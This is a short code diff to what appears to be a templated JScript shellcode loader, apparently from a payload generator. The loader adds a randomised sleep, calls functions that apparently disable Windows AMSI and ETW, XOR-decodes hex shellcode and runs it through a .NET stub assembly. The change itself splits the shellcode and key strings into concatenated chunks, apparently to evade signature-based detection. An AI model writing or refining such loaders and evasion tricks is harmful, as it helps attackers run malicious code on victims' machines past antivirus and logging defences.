@@ -70,7 +70,7 @@
         WScript.Sleep(2000 + Math.floor(Math.random() * 3000));
         {{ v.fn_amsi }}();
         {{ v.fn_etw }}();
-        var sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"), {{ v.fn_hex }}("{{ key_hex }}"));
+        var sc = {{ v.fn_xor }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}));
         var loader = new ActiveXObject("System.Reflection.Assembly");
         var asm = loader.Load({{ v.fn_hex }}("{{ v.dotnet_stub_hex }}"));
         asm.GetType("Stub.Loader").GetMethod("Run").Invoke(null, [sc]);
